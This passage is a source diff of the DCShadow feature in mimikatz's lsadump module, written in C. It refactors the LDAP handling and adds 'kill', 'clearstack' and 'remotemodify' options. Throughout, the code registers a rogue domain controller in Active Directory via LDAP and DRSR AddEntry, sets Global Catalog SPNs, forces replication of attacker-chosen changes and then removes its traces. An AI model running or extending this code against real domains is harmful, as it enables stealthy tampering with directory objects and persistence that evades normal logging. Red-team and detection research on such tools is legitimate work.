 		RtlCopyMemory(&msgIn.V2.EntInfList.Entinf, &reply.pObjects->Entinf, sizeof(ENTINF));
 		RpcTryExcept
 		{
@@ -1823,7 +2292,7 @@ ULONG kuhl_m_lsadump_dcshadow_call_AddEntry(PDCSHADOW_DOMAIN_INFO dif, DRS_HANDL
 	return status;
 }
 
-ULONG kuhl_m_lsadump_dcshadow_register_NTDSA_AddEntry(PDCSHADOW_DOMAIN_INFO dif, DRS_HANDLE hDrs)
+ULONG kuhl_m_lsadump_dcshadow_register_NTDSA_AddEntry(PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	DWORD i;
@@ -1832,7 +2301,7 @@ ULONG kuhl_m_lsadump_dcshadow_register_NTDSA_AddEntry(PDCSHADOW_DOMAIN_INFO dif,
 	GUID InvocationId;
 	wchar_t szInvocationId[2 * sizeof(GUID) + 1];
 	PWSTR pszInvocationId = (PWSTR) &szInvocationId;
-	PWSTR pszHasMasterNC[] = {dif->szDomainNamingContext, dif->szConfigurationNamingContext, dif->szSchemaNamingContext};
+	PWSTR pszHasMasterNC[] = {info->szDomainNamingContext, info->szConfigurationNamingContext, info->szSchemaNamingContext};
 	PWSTR szObjectClassOid = TEXT(szOID_ANSI_nTDSDSA);
 	PWSTR szSystemFlags = L"16", szOption = L"0";
 	
@@ -1851,41 +2320,41 @@ ULONG kuhl_m_lsadump_dcshadow_register_NTDSA_AddEntry(PDCSHADOW_DOMAIN_INFO dif,
 	DCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE values[ARRAYSIZE(attributes)] = {
 		{attributes +  0, {0}, {1, NULL}, &szObjectClassOid},
 		{attributes +  1, {0}, {3, NULL}, pszHasMasterNC},
-		{attributes +  2, {0}, {1, NULL}, &dif->szSchemaNamingContext},
+		{attributes +  2, {0}, {1, NULL}, &info->szSchemaNamingContext},
 		{attributes +  3, {0}, {1, NULL}, &pszInvocationId},
 		{attributes +  4, {0}, {1, NULL}, &szOption},
 		{attributes +  5, {0}, {1, NULL}, &szSystemFlags},
-		{attributes +  6, {0}, {1, NULL}, &dif->szFakeDN},
+		{attributes +  6, {0}, {1, NULL}, &info->szFakeDN},
 		{attributes +  7, {0}, {1, NULL}, &pszFunctionalLevel},
-		{attributes +  8, {0}, {1, NULL}, &dif->szDomainNamingContext},
+		{attributes +  8, {0}, {1, NULL}, &info->szDomainNamingContext},
 		{attributes +  9, {0}, {3, NULL}, pszHasMasterNC},
 	};
-	DCSHADOW_PUSH_REQUEST_OBJECT object = {TRUE, NULL, {0}, {0}, ARRAYSIZE(values), values};
+	DCSHADOW_PUSH_REQUEST_OBJECT object = {NULL, {0}, {0}, {0}, ARRAYSIZE(values), values, OBJECT_TO_ADD};
 
-	szFunctionalLevel[0] += (WCHAR) dif->dwDomainControllerFunctionality;
+	szFunctionalLevel[0] += (WCHAR) info->dwDomainControllerFunctionality;
 	UuidCreate(&InvocationId);
 	
 	for(i = 0; i < sizeof(GUID); i++)
 		swprintf_s(szInvocationId + 2 * i, 2 * sizeof(GUID) + 1 - 2 * i, L"%02X", ((PBYTE) &InvocationId)[i]);
 	
-	if(kull_m_string_sprintf(&object.szObjectDN, L"CN=NTDS Settings,CN=%s%s", dif->szFakeDCNetBIOS, dif->szDsServiceName))
+	if(kull_m_string_sprintf(&object.szObjectDN, L"CN=NTDS Settings,CN=%s%s", info->szFakeDCNetBIOS, info->szDsServiceName))
 	{
 		for(i = 0; i < object.cbAttributes; i++)
 			if(!kuhl_m_lsadump_dcshadow_build_replication_value(object.pAttributes + i))
 				break;
 		if(i == object.cbAttributes)
-			status = kuhl_m_lsadump_dcshadow_call_AddEntry(dif, hDrs, &object);
+			status = kuhl_m_lsadump_dcshadow_call_AddEntry(info, hDrs, &object);
 	}
 	return status;
 }
 
-ULONG kuhl_m_lsadump_dcshadow_call_AddEntry_manual(PDCSHADOW_DOMAIN_INFO dif, DRS_HANDLE hDrs)
+ULONG kuhl_m_lsadump_dcshadow_call_AddEntry_manual(PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	DWORD i;
-	for(i = 0; i < dif->request->cNumObjects; i++)
+	for(i = 0; i < info->request->cNumObjects; i++)
 	{
-		if(!NT_SUCCESS(status = kuhl_m_lsadump_dcshadow_call_AddEntry(dif, hDrs, dif->request->pObjects + i)))
+		if(!NT_SUCCESS(status = kuhl_m_lsadump_dcshadow_call_AddEntry(info, hDrs, info->request->pObjects + i)))
 		{
 			PRINT_ERROR(L"DRSAddEntry object %u: 0x%08x\n", i, status);
 			break;
@@ -1894,23 +2363,23 @@ ULONG kuhl_m_lsadump_dcshadow_call_AddEntry_manual(PDCSHADOW_DOMAIN_INFO dif, DR
 	return status;
 }
 
-typedef ULONG (*kuhl_m_lsadump_dcshadow_bind_DRSR_function) (PDCSHADOW_DOMAIN_INFO dif, DRS_HANDLE hDrs);
-ULONG kuhl_m_lsadump_dcshadow_bind_DRSR(PDCSHADOW_DOMAIN_INFO dif, kuhl_m_lsadump_dcshadow_bind_DRSR_function function)
+typedef ULONG (*kuhl_m_lsadump_dcshadow_bind_DRSR_function) (PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs);
+ULONG kuhl_m_lsadump_dcshadow_bind_DRSR(PDCSHADOW_DOMAIN_INFO info, kuhl_m_lsadump_dcshadow_bind_DRSR_function function)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	RPC_BINDING_HANDLE hBinding;
 	DRS_HANDLE hDrs = NULL;
 	DRS_EXTENSIONS_INT DrsExtensionsInt;
 	
-	if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", dif->szDCFQDN, NULL, L"ldap", TRUE, (MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
+	if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", info->szDCFQDN, NULL, L"ldap", TRUE, (MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
 	{
 		RtlZeroMemory(&DrsExtensionsInt, sizeof(DRS_EXTENSIONS_INT));
 		DrsExtensionsInt.cb = sizeof(DRS_EXTENSIONS_INT) - sizeof(DWORD);
 		DrsExtensionsInt.dwFlags = DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_STRONG_ENCRYPTION;
-		DrsExtensionsInt.dwReplEpoch = dif->dwReplEpoch;
-		if(kull_m_rpc_drsr_getDCBind(&hBinding, &(dif->realDc.InvocationId), &hDrs, &DrsExtensionsInt))
+		DrsExtensionsInt.dwReplEpoch = info->dwReplEpoch;
+		if(kull_m_rpc_drsr_getDCBind(&hBinding, &(info->realDc.InvocationId), &hDrs, &DrsExtensionsInt))
 		{
-			status = function(dif, hDrs);
+			status = function(info, hDrs);
 			IDL_DRSUnbind(&hDrs);
 		}
 		kull_m_rpc_deleteBinding(&hBinding);
@@ -1919,17 +2388,17 @@ ULONG kuhl_m_lsadump_dcshadow_bind_DRSR(PDCSHADOW_DOMAIN_INFO dif, kuhl_m_lsadum
 	return status;
 }
 
-ULONG kuhl_m_lsadump_dcshadow_register_NTDSA(PDCSHADOW_DOMAIN_INFO dif)
+ULONG kuhl_m_lsadump_dcshadow_register_NTDSA(PDCSHADOW_DOMAIN_INFO info)
 {
-	return kuhl_m_lsadump_dcshadow_bind_DRSR(dif, kuhl_m_lsadump_dcshadow_register_NTDSA_AddEntry);
+	return kuhl_m_lsadump_dcshadow_bind_DRSR(info, kuhl_m_lsadump_dcshadow_register_NTDSA_AddEntry);
 }
 
-ULONG kuhl_m_lsadump_dcshadow_AddEntry(PDCSHADOW_DOMAIN_INFO dif)
+ULONG kuhl_m_lsadump_dcshadow_AddEntry(PDCSHADOW_DOMAIN_INFO info)
 {
-	return kuhl_m_lsadump_dcshadow_bind_DRSR(dif, kuhl_m_lsadump_dcshadow_call_AddEntry_manual);
+	return kuhl_m_lsadump_dcshadow_bind_DRSR(info, kuhl_m_lsadump_dcshadow_call_AddEntry_manual);
 }
 
-BOOL kuhl_m_lsadump_dcshadow_register_ldap(PDCSHADOW_DOMAIN_INFO dif, PLDAP ld)
+BOOL kuhl_m_lsadump_dcshadow_register_ldap(PDCSHADOW_DOMAIN_INFO info)
 {
 	BOOL fSuccess = FALSE;
 	DWORD dwErr = 0;
@@ -1939,8 +2408,8 @@ BOOL kuhl_m_lsadump_dcshadow_register_ldap(PDCSHADOW_DOMAIN_INFO dif, PLDAP ld)
 	LDAPMod *ldapmods[] = {&ldapmodOC, &ldapmodDNS, &ldapmodServerReference, NULL};
 	PWSTR szDN;
 	PWSTR szValsOC[] = {L"server", NULL};
-	PWSTR szValsDNS[] = {dif->szFakeFQDN, NULL};
-	PWSTR szValsServerReference[] = {dif->szFakeDN, NULL};
+	PWSTR szValsDNS[] = {info->szFakeFQDN, NULL};
+	PWSTR szValsServerReference[] = {info->szFakeDN, NULL};
 	PWSTR szSPNAttribute[] = {NULL, NULL};
 	LDAPMod ldapmodSPN = {0};
 	LDAPMod *ldapmodServer[] = {&ldapmodSPN, NULL};
@@ -1960,13 +2429,13 @@ BOOL kuhl_m_lsadump_dcshadow_register_ldap(PDCSHADOW_DOMAIN_INFO dif, PLDAP ld)
 	ldapmodSPN.mod_type = L"servicePrincipalName";
 	ldapmodSPN.mod_vals.modv_strvals = szSPNAttribute;
 
-	if(kull_m_string_sprintf(&szDN, L"CN=%s%s", dif->szFakeDCNetBIOS, dif->szDsServiceName))
+	if(kull_m_string_sprintf(&szDN, L"CN=%s%s", info->szFakeDCNetBIOS, info->szDsServiceName))
 	{
-		if(kull_m_string_sprintf(szSPNAttribute, L"GC/%s/%s", dif->szFakeFQDN, dif->szDomainName))
+		if(kull_m_string_sprintf(szSPNAttribute, L"GC/%s/%s", info->szFakeFQDN, info->szDomainName))
 		{
-			if(!(dwErr = ldap_add_s(ld, szDN, ldapmods)))
+			if(!(dwErr = ldap_add_s(info->ld, szDN, ldapmods)))
 			{
-				if(!(dwErr = ldap_modify_s(ld, dif->szFakeDN, ldapmodServer)))
+				if(!(dwErr = ldap_modify_s(info->ld, info->szFakeDN, ldapmodServer)))
 					fSuccess = TRUE;
 				else PRINT_ERROR(L"ldap_modify_s computer SPN 0x%x (%u)\n", dwErr, dwErr);
 			}
@@ -1978,44 +2447,21 @@ BOOL kuhl_m_lsadump_dcshadow_register_ldap(PDCSHADOW_DOMAIN_INFO dif, PLDAP ld)
 	return fSuccess;
 }
 
-NTSTATUS kuhl_m_lsadump_dcshadow_register(PDCSHADOW_DOMAIN_INFO dif)
+NTSTATUS kuhl_m_lsadump_dcshadow_register(PDCSHADOW_DOMAIN_INFO info)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
-	PLDAP ld;
-	DWORD dwErr;
 	
-	if(!dif->mimiDc.isInstanceId)
+	if(!info->mimiDc.isInstanceId)
 	{
-		if(ld = ldap_init((PWSTR) dif->szDCFQDN, 389))
+		if(kuhl_m_lsadump_dcshadow_register_ldap(info))
 		{
-			if(!(dwErr = ldap_connect(ld, NULL)))
+			if(NT_SUCCESS(kuhl_m_lsadump_dcshadow_register_NTDSA(info)))
 			{
-				if(!(dwErr = ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE)))
-				{
-					if(kuhl_m_lsadump_dcshadow_register_ldap(dif, ld))
-					{
-						if(NT_SUCCESS(kuhl_m_lsadump_dcshadow_register_NTDSA(dif)))
-						{
-							if(kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(ld, dif, dif->szFakeFQDN, &dif->mimiDc))
-								status = STATUS_SUCCESS;
-							else PRINT_ERROR(L"Unable to get invocation Id\n");
-						}
-						else PRINT_ERROR(L"Unable to add object via Drs\n");
-					}
-					else PRINT_ERROR(L"Unable to add object via ldap\n");
-				}
-				else PRINT_ERROR(L"ldap_bind_s 0x%x (%u)\n", dwErr, dwErr);
+				if(kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(info, info->szFakeFQDN, &info->mimiDc))
+					status = STATUS_SUCCESS;
+				else PRINT_ERROR(L"Unable to get invocation Id\n");
 			}
-			else
-			{
-				PRINT_ERROR(L"ldap_connect 0x%x (%u)\n", dwErr, dwErr);
-				ldap_unbind(ld);
-			}
-		}
-		else
-		{
-			dwErr = LdapGetLastError();
-			PRINT_ERROR(L"ldap_init 0x%x (%u)\n", dwErr, dwErr);
+			else PRINT_ERROR(L"Unable to add object via Drs\n");
 		}
 	}
 	else
@@ -2026,13 +2472,13 @@ NTSTATUS kuhl_m_lsadump_dcshadow_register(PDCSHADOW_DOMAIN_INFO dif)
 	return status;
 }
 
-NTSTATUS kuhl_m_lsadump_dcshadow_force_sync_partition(PDCSHADOW_DOMAIN_INFO dif, DRS_HANDLE hDrs, PWSTR szPartition)
+NTSTATUS kuhl_m_lsadump_dcshadow_force_sync_partition(PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs, PWSTR szPartition)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	ATTRVAL attrVal = {0};
 	DRS_MSG_REPADD msgAdd = {0};
 	DRS_MSG_REPDEL msgDel = {0};
-	PSTR szANSIFakeDCFQDN = kull_m_string_unicode_to_ansi(dif->szFakeFQDN);
+	PSTR szANSIFakeDCFQDN = kull_m_string_unicode_to_ansi(info->szFakeFQDN);
 	
 	if(szANSIFakeDCFQDN)
 	{
@@ -2059,25 +2505,25 @@ NTSTATUS kuhl_m_lsadump_dcshadow_force_sync_partition(PDCSHADOW_DOMAIN_INFO dif,
 	return status;
 }
 
-NTSTATUS kuhl_m_lsadump_dcshadow_force_sync(PDCSHADOW_DOMAIN_INFO dif, DRS_HANDLE hDrs)
+NTSTATUS kuhl_m_lsadump_dcshadow_force_sync(PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	
-	if(dif->dwPushFlags & DOMAIN_INFO_PUSH_FLAGS_ROOT)
+	if(info->dwPushFlags & DOMAIN_INFO_PUSH_FLAGS_ROOT)
 	{
-		status = kuhl_m_lsadump_dcshadow_force_sync_partition(dif, hDrs, dif->szDomainNamingContext);
+		status = kuhl_m_lsadump_dcshadow_force_sync_partition(info, hDrs, info->szDomainNamingContext);
 		if(!NT_SUCCESS(status))
 			return status;
 	}
-	if(dif->dwPushFlags & DOMAIN_INFO_PUSH_FLAGS_CONFIG)
+	if(info->dwPushFlags & DOMAIN_INFO_PUSH_FLAGS_CONFIG)
 	{
-		status = kuhl_m_lsadump_dcshadow_force_sync_partition(dif, hDrs, dif->szConfigurationNamingContext);
+		status = kuhl_m_lsadump_dcshadow_force_sync_partition(info, hDrs, info->szConfigurationNamingContext);
 		if(!NT_SUCCESS(status))
 			return status;
 	}
-	if(dif->dwPushFlags & DOMAIN_INFO_PUSH_FLAGS_SCHEMA)
+	if(info->dwPushFlags & DOMAIN_INFO_PUSH_FLAGS_SCHEMA)
 	{
-		status = kuhl_m_lsadump_dcshadow_force_sync_partition(dif, hDrs, dif->szSchemaNamingContext);
+		status = kuhl_m_lsadump_dcshadow_force_sync_partition(info, hDrs, info->szSchemaNamingContext);
 		if(!NT_SUCCESS(status))
 			return status;
 	}
@@ -2085,14 +2531,13 @@ NTSTATUS kuhl_m_lsadump_dcshadow_force_sync(PDCSHADOW_DOMAIN_INFO dif, DRS_HANDL
 }
 
 // start the rpc server, force a sync, and stop the rpc server
-NTSTATUS kuhl_m_lsadump_dcshadow_push(PDCSHADOW_DOMAIN_INFO dif)
+NTSTATUS kuhl_m_lsadump_dcshadow_push(PDCSHADOW_DOMAIN_INFO info)
 {
-	return kuhl_m_lsadump_dcshadow_bind_DRSR(dif, kuhl_m_lsadump_dcshadow_force_sync);;
+	return kuhl_m_lsadump_dcshadow_bind_DRSR(info, kuhl_m_lsadump_dcshadow_force_sync);;
 }
 
-NTSTATUS kuhl_m_lsadump_dcshadow_unregister(PDCSHADOW_DOMAIN_INFO dif)
+NTSTATUS kuhl_m_lsadump_dcshadow_unregister(PDCSHADOW_DOMAIN_INFO info)
 {
-	PLDAP ld;
 	BOOL fSuccess = FALSE;
 	DWORD dwErr = 0;
 	PWSTR sitesBase, sitesFilter, serverBase, NTDSBase;
@@ -2101,74 +2546,73 @@ NTSTATUS kuhl_m_lsadump_dcshadow_unregister(PDCSHADOW_DOMAIN_INFO dif)
 	LDAPMod ldapmodSPN = {0};
 	LDAPMod *ldapmodServer[] = {&ldapmodSPN, NULL};
 	
-	if(ld = ldap_init((PWSTR) dif->szDCFQDN, 389))
+	if(kull_m_string_sprintf(&sitesBase, L"CN=Sites,%s", info->szConfigurationNamingContext))
 	{
-		if(!(dwErr = ldap_connect(ld, NULL)))
+		if(kull_m_string_sprintf(&sitesFilter, L"(&(objectClass=server)(dNSHostName=%s))", info->szFakeFQDN))
 		{
-			if(!(dwErr = ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE)))
+			dwErr = ldap_search_sW(info->ld, sitesBase, LDAP_SCOPE_SUBTREE, sitesFilter, NULL, FALSE, &pSitesMessage);
+			if(dwErr == LDAP_SUCCESS)
 			{
-				if(kull_m_string_sprintf(&sitesBase, L"CN=Sites,%s", dif->szConfigurationNamingContext))
+				if(ldap_count_entries(info->ld, pSitesMessage) == 1)
 				{
-					if(kull_m_string_sprintf(&sitesFilter, L"(&(objectClass=server)(dNSHostName=%s))", dif->szFakeFQDN))
+					if(serverBase = ldap_get_dnW(info->ld, pSitesMessage))
 					{
-						dwErr = ldap_search_sW(ld, sitesBase, LDAP_SCOPE_SUBTREE, sitesFilter, NULL, FALSE, &pSitesMessage);
+						dwErr = ldap_search_sW(info->ld, serverBase, LDAP_SCOPE_ONELEVEL, L"(name=NTDS Settings)", NULL, FALSE, &pServerMessage);
 						if(dwErr == LDAP_SUCCESS)
 						{
-							if(ldap_count_entries(ld, pSitesMessage) == 1)
+							if(NTDSBase = ldap_get_dnW(info->ld, pServerMessage))
 							{
-								if(serverBase = ldap_get_dnW(ld, pSitesMessage))
-								{
-									dwErr = ldap_search_sW(ld, serverBase, LDAP_SCOPE_ONELEVEL, L"(name=NTDS Settings)", NULL, FALSE, &pServerMessage);
-									if(dwErr == LDAP_SUCCESS)
-									{
-										if(NTDSBase = ldap_get_dnW(ld, pServerMessage))
-										{
-											if((dwErr = ldap_delete_s(ld, NTDSBase)) != LDAP_SUCCESS)
-												PRINT_ERROR(L"ldap_delete_s %s 0x%x (%u)\n", NTDSBase, dwErr, dwErr);
-											else fSuccess = TRUE;
-											ldap_memfreeW(NTDSBase);
-										}
-										ldap_msgfree(pServerMessage);
-									}
-									else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);
-									if((dwErr = ldap_delete_s(ld, serverBase)) != LDAP_SUCCESS)
-										PRINT_ERROR(L"ldap_delete_s %s 0x%x (%u)\n", serverBase, dwErr, dwErr);
-									ldap_memfreeW(serverBase);
-								}
+								if((dwErr = ldap_delete_s(info->ld, NTDSBase)) != LDAP_SUCCESS)
+									PRINT_ERROR(L"ldap_delete_s %s 0x%x (%u)\n", NTDSBase, dwErr, dwErr);
+								else fSuccess = TRUE;
+								ldap_memfreeW(NTDSBase);
 							}
-							else PRINT_ERROR(L"ldap_count_entries is NOT 1\n");
-							ldap_msgfree(pSitesMessage);
+							ldap_msgfree(pServerMessage);
 						}
 						else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);
-						LocalFree(sitesFilter);
+						if((dwErr = ldap_delete_s(info->ld, serverBase)) != LDAP_SUCCESS)
+							PRINT_ERROR(L"ldap_delete_s %s 0x%x (%u)\n", serverBase, dwErr, dwErr);
+						ldap_memfreeW(serverBase);
 					}
-					LocalFree(sitesBase);
 				}
-
-				ldapmodSPN.mod_op = LDAP_MOD_DELETE;
-				ldapmodSPN.mod_type = L"servicePrincipalName";
-				ldapmodSPN.mod_vals.modv_strvals = szSPNAttribute;
-				if(kull_m_string_sprintf(szSPNAttribute, L"GC/%s/%s", dif->szFakeFQDN, dif->szDomainName))
-				{
-					if((dwErr = ldap_modify_s(ld, dif->szFakeDN, ldapmodServer)) != 0)
-						PRINT_ERROR(L"ldap_modify_s computer SPN 0x%x (%u)\n", dwErr, dwErr); 
-				}
+				else PRINT_ERROR(L"ldap_count_entries is NOT 1\n");
+				ldap_msgfree(pSitesMessage);
 			}
-			else
-				PRINT_ERROR(L"ldap_bind_s 0x%x (%u)\n", dwErr, dwErr);
+			else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);
+			LocalFree(sitesFilter);
 		}
-		else
-		{
-			PRINT_ERROR(L"ldap_connect 0x%x (%u)\n", dwErr, dwErr);
-			ldap_unbind(ld);
-		}
+		LocalFree(sitesBase);
 	}
-	else
+
+	ldapmodSPN.mod_op = LDAP_MOD_DELETE;
+	ldapmodSPN.mod_type = L"servicePrincipalName";
+	ldapmodSPN.mod_vals.modv_strvals = szSPNAttribute;
+	if(kull_m_string_sprintf(szSPNAttribute, L"GC/%s/%s", info->szFakeFQDN, info->szDomainName))
 	{
-		dwErr = LdapGetLastError();
-		PRINT_ERROR(L"ldap_init 0x%x (%u)\n", dwErr, dwErr);
+		if((dwErr = ldap_modify_s(info->ld, info->szFakeDN, ldapmodServer)) != 0)
+			PRINT_ERROR(L"ldap_modify_s computer SPN 0x%x (%u)\n", dwErr, dwErr); 
 	}
 	return (fSuccess?STATUS_SUCCESS: STATUS_UNSUCCESSFUL);
+}
+
+VOID kuhl_m_lsadump_dcshadow_init_prefixtable(SCHEMA_PREFIX_TABLE* prefixTable)
+{
+	DWORD i;
+	prefixTable->pPrefixEntry = (PrefixTableEntry*) MIDL_user_allocate(sizeof(PrefixTableEntry) * SCHEMA_DEFAULT_PREFIX_TABLE.PrefixCount);
+	if (prefixTable->pPrefixEntry)
+	{
+		for(i = 0; i < SCHEMA_DEFAULT_PREFIX_TABLE.PrefixCount; i++)
+		{
+			prefixTable->pPrefixEntry[i].prefix.elements = (PBYTE) MIDL_user_allocate(SCHEMA_DEFAULT_PREFIX_TABLE.pPrefixEntry[i].prefix.length);
+			if (prefixTable->pPrefixEntry[i].prefix.elements)
+			{
+				RtlCopyMemory(prefixTable->pPrefixEntry[i].prefix.elements, SCHEMA_DEFAULT_PREFIX_TABLE.pPrefixEntry[i].prefix.elements, SCHEMA_DEFAULT_PREFIX_TABLE.pPrefixEntry[i].prefix.length);
+				prefixTable->pPrefixEntry[i].prefix.length = SCHEMA_DEFAULT_PREFIX_TABLE.pPrefixEntry[i].prefix.length;
+				prefixTable->pPrefixEntry[i].ndx = SCHEMA_DEFAULT_PREFIX_TABLE.pPrefixEntry[i].ndx;
+			}
+		}
+		prefixTable->PrefixCount = SCHEMA_DEFAULT_PREFIX_TABLE.PrefixCount;
+	}
 }
 
 // variable used if multiple changes are to be stacked
@@ -2199,18 +2643,20 @@ NTSTATUS kuhl_m_lsadump_dcshadow(int argc, wchar_t * argv[])
 	PPOLICY_DNS_DOMAIN_INFO pPolicyDnsDomainInfo = NULL;
 	WCHAR szMyComputerNetBios[MAX_COMPUTERNAME_LENGTH + 1];
 	DWORD dwSize = MAX_COMPUTERNAME_LENGTH +1;
+	PWSTR szObjectToKill = NULL;
 	BOOL fStack = kull_m_string_args_byName(argc, argv, L"stack", NULL, NULL);
 	BOOL fViewStack = kull_m_string_args_byName(argc, argv, L"viewstack", NULL, NULL);
+	BOOL fClearStack = kull_m_string_args_byName(argc, argv, L"clearstack", NULL, NULL);
 	BOOL fPush = kull_m_string_args_byName(argc, argv, L"push", NULL, NULL);
 	BOOL fManualRegister = kull_m_string_args_byName(argc, argv, L"manualregister", NULL, NULL);
 	BOOL fManualPush = kull_m_string_args_byName(argc, argv, L"manualpush", NULL, NULL);
 	BOOL fManualUnregister = kull_m_string_args_byName(argc, argv, L"manualunregister", NULL, NULL);
 	BOOL fManualAddEntry = kull_m_string_args_byName(argc, argv, L"addentry", NULL, NULL);
 	BOOL fViewReplicationOnly = kull_m_string_args_byName(argc, argv, L"viewreplication", NULL, NULL);
-	BOOL fStartServer = fViewReplicationOnly || !(fManualRegister || fManualPush || fManualUnregister || fPush || fManualAddEntry);
+	BOOL fKillViaLingering = kull_m_string_args_byName(argc, argv, L"kill", &szObjectToKill, NULL);
+	BOOL fStartServer = fViewReplicationOnly || !(fManualRegister || fManualPush || fManualUnregister || fPush || fManualAddEntry || fKillViaLingering);
 	
 	LPCWSTR szDomain = NULL;
-	//_CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_CHECK_ALWAYS_DF | _CRTDBG_CHECK_CRT_DF | _CRTDBG_DELAY_FREE_MEM_DF);
 	
 	pDCShadowDomainInfoInUse = &DCShadowDomainInfo;
 	pDCShadowDomainInfoInUse->fUseSchemaSignature = FALSE;
@@ -2255,86 +2701,108 @@ NTSTATUS kuhl_m_lsadump_dcshadow(int argc, wchar_t * argv[])
 	{
 		status = kuhl_m_lsadump_dcshadow_view(&stackedRequest);
 	}
+	else if (fClearStack)
+	{
+		kuhl_m_lsadump_dcshadow_clean_push_request(&stackedRequest);
+	}
 	else
 	{
 		// a communication will be done with the target DC
-		// get the attributes to encode
-		if(fStartServer && !fViewReplicationOnly)
-			status = kuhl_m_lsadump_dcshadow_encode(&stackedRequest, argc, argv);
-		if(NT_SUCCESS(status) && (!fStartServer || (fViewReplicationOnly || stackedRequest.cNumObjects > 0 )))
+		if ((status = kuhl_m_lsadump_dcshadow_init_ldap(pDCShadowDomainInfoInUse->szDCFQDN, &pDCShadowDomainInfoInUse->ld)) == ERROR_SUCCESS)
 		{
-			if((fStartServer && !fViewReplicationOnly) || fManualAddEntry)
-				// reuse stack - will be encoded by kuhl_m_lsadump_dcshadow_domaininfo
-				pDCShadowDomainInfoInUse->request = &stackedRequest;
-			// collect information needed for further code - this is where attributes are encoded
-			if(kuhl_m_lsadump_dcshadow_domain_and_replication_info(pDCShadowDomainInfoInUse))
+			// get the attributes to encode
+			if(fStartServer && !fViewReplicationOnly)
+				status = kuhl_m_lsadump_dcshadow_encode(&stackedRequest, argc, argv);
+			if(NT_SUCCESS(status) && (!fStartServer || (fViewReplicationOnly || stackedRequest.cNumObjects > 0 )))
 			{
-				if(fManualAddEntry)
+				if((fStartServer && !fViewReplicationOnly) || fManualAddEntry)
+					// reuse stack - will be encoded by kuhl_m_lsadump_dcshadow_domaininfo
+					pDCShadowDomainInfoInUse->request = &stackedRequest;
+				// collect information needed for further code - this is where attributes are encoded
+				if(kuhl_m_lsadump_dcshadow_domain_and_replication_info(pDCShadowDomainInfoInUse))
 				{
-					kprintf(L"** Performing AddEntry **\n\n");
-					status = kuhl_m_lsadump_dcshadow_AddEntry(pDCShadowDomainInfoInUse);
-					if(status != STATUS_SUCCESS)
+					if(fManualAddEntry)
 					{
-						PRINT_ERROR(L"unable to perform AddEntry: %08x\n", status);
-						// avoid cleaning the request
-						pDCShadowDomainInfoInUse->request = NULL;
-					}
-				}
-				else if(fStartServer)
-				{
-					kprintf(L"** Starting server **\n\n");
-					pDCShadowDomainInfoInUse->hGetNCChangeCalled = CreateEvent(NULL, TRUE, FALSE, NULL);
-					status = kull_m_rpc_drsr_start_server(pDCShadowDomainInfoInUse->szDomainName, &pDCShadowDomainInfoInUse->mimiDc.InstanceId);
-					// not NT_SUCCESS because a server already started return 0x6b1 which is considered as a warning (success)
-					if(status != STATUS_SUCCESS)
-					{
-						PRINT_ERROR(L"unable to start the server: %08x\n", status);
-						// avoid cleaning the request
-						pDCShadowDomainInfoInUse->request = NULL;
-					}
-					else
-					{
-						if(fViewReplicationOnly)
+						if (kull_m_string_args_byName(argc, argv, L"remotemodify", NULL, NULL))
+							pDCShadowDomainInfoInUse->dwPushFlags |= DOMAIN_INFO_PUSH_REMOTE_MODIFY;
+						kprintf(L"** Performing AddEntry **\n\n");
+						status = kuhl_m_lsadump_dcshadow_AddEntry(pDCShadowDomainInfoInUse);
+						if(status != STATUS_SUCCESS)
 						{
-							kprintf(L"== Press Any Key to stop ==\n");
-							getchar();
+							PRINT_ERROR(L"unable to perform AddEntry: %08x\n", status);
+							// avoid cleaning the request
+							pDCShadowDomainInfoInUse->request = NULL;
+						}
+					}
+					else if(fStartServer)
+					{
+						kprintf(L"** Starting server **\n\n");
+						pDCShadowDomainInfoInUse->hGetNCChangeCalled = CreateEvent(NULL, TRUE, FALSE, NULL);
+						status = kull_m_rpc_drsr_start_server(pDCShadowDomainInfoInUse->szDomainName, &pDCShadowDomainInfoInUse->mimiDc.InstanceId);
+						// not NT_SUCCESS because a server already started return 0x6b1 which is considered as a warning (success)
+						if(status != STATUS_SUCCESS)
+						{
+							PRINT_ERROR(L"unable to start the server: %08x\n", status);
+							// avoid cleaning the request
+							pDCShadowDomainInfoInUse->request = NULL;
 						}
 						else
 						{
-							kprintf(L"== Press Control+C to stop ==\n");
-							SetConsoleCtrlHandler(kuhl_m_lsadump_dcshadow_control_C, TRUE);
-							WaitForSingleObject(pDCShadowDomainInfoInUse->hGetNCChangeCalled, INFINITE);
-							SetConsoleCtrlHandler(kuhl_m_lsadump_dcshadow_control_C, FALSE);
-							// wait for the RPC call to complete and the Drs Bind to be close by the DC
-							Sleep(500);
+							if(fViewReplicationOnly)
+							{
